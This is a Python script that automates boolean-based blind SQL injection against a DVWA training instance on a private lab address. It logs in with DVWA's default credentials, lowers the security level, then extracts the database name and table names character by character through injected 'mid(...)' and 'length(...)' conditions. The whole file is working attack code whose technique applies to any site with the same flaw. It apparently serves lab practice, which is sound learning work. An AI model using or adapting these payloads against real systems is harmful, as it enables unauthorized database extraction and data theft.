#!/usr/bin/env python

import requests
import string

s = requests.Session()

#lista = 'abcdefghijklmnopqrstuvwxyz'
lista = range(97,123)

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url=url, data=params)
    print("\n- Logged In.")


def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'low','seclev_submit':'Submit'}
    r = s.post(url=url, data=params)
    print("- Security set to Low.")


def db_name():
    for i in range(1,10):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and length(database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\nDatabase length is: " + i)
            break
    count = int(i)  
    
    print("Database: ",end='')
    db_name = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            c =chr(c)
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and mid(database(),{j},1)='{c}'-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                db_name = db_name+c
                print(c,end='',flush=True)
            

def tables():
    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(table_name) from information_schema.tables where table_schema=database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("\n\nTables count: " + i)
            break
    count = int(i) 

    
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of table {tc}: " + str(i))

    tbl_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                tblLen = i
                print(f"\nTable {tc}: ",end='')

                for n in range(1,tblLen+1):
                    n = str(n)
                    for c in lista:
                        c = chr(c)
                        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
                        params = {"id":f"1' and mid((select table_name from information_schema.tables where table_schema=database() limit {tc},1),{n},1)='{c}'-- -","Submit":"Submit"}
                        r = s.get(url=url, params=params)
                        if "Surname" in r.text:
                            tbl_name = tbl_name + c
                            print(c,end='',flush=True)
                 

def main():
    dvwa_login()
    dvwa_security()
    db_name()
    tables()

if __name__=="__main__":
    main()

